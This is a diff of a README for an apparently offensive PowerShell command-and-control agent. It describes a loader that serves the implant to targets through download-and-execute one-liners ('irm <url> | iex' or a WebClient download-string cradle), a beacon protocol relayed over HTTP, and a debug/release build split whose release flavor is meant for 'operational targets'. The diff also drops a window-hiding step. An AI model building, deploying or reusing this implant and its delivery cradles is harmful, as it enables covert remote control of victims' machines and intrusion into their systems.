@@ -42,10 +42,10 @@ window and process manipulation. The agent itself performs none. Concretely:
 - It reads `H_URL` from the process environment, so the host must set it (`$env:H_URL = ...`)
   **before** calling `Invoke-Agent`.
 
-The C2 PowerShell Loader panel is the reference host: it emits `$env:H_URL = '...'`, a
-best-effort `hideWindow` mini (user32 `ShowWindow(0)`), the agent text verbatim, then
-`$null = Invoke-Agent` — and serves the result through file hosting as `irm <url> | iex`
-(PowerShell 3+) or the `Net.WebClient` download-string one-liner (2.0-compatible).
+The C2 PowerShell Loader panel is the reference host: it emits `$env:H_URL = '...'`, the
+agent text verbatim, then `$null = Invoke-Agent` — and serves the result through file
+hosting as `irm <url> | iex` (PowerShell 3+) or the `Net.WebClient` download-string
+one-liner (2.0-compatible).
 
 ## Beacon contract (v3)
 
@@ -74,6 +74,31 @@ Spoken against the HTTP relay (see the `http-relay` worker — the beacon leg an
 
 Every reply echoes the command's correlation id after its status: `[status:u32le][corrId:u32le]`;
 id 0 = unmatched.
+
+## Debug vs release
+
+PowerShell has no preprocessor, so the flavor split is a **line tag**: any source line ending in a
+`#dbg` comment exists only in the debug build. [`build.ps1`](build.ps1) splits the flavors and
+gates the result (both flavors must parse and keep the fetch-contract needle; the release flavor
+must carry zero debug surface — the build fails loudly otherwise):
+
+```
+powershell -NoProfile -ExecutionPolicy Bypass -File build.ps1
+# → dist/powershell-agent.ps1        release: every #dbg line REMOVED (zero diagnostics)
+# → dist-debug/powershell-agent.ps1  debug:   #dbg lines kept, tag suffix dropped
+```
+
+The debug build pops a **blocking topmost MessageBox per milestone** (the csharp-agent
+`Diag.Show` contract — WScript.Shell `Popup`, caption `ps-agent dbg <step>`): `[1] start`,
+`[2] H_URL`, `[3] tls`, `[5] identity`, `[6]`/`[7] POST #1` (first beacon cycle only — healthy
+idle iterations stay silent), `[cmd] 0x…` per dispatched command, `[exit] …` on fatal branches,
+`[0x0B] upgrade failed` with the exception message. Hand-debugging only: popups are
+operator-visible and every call costs a click.
+
+CI publishes two rolling pre-releases from `main` with the same asset filename — **the tag is
+the flavor** (the csharp-agent contract): `preview` = release flavor, `debug` = debug flavor.
+The CI smoke test runs the release flavor only (a debug popup would park an unattended runner
+forever). Never deliver the `debug` flavor to an operational target.
 
 ## Local verification
 
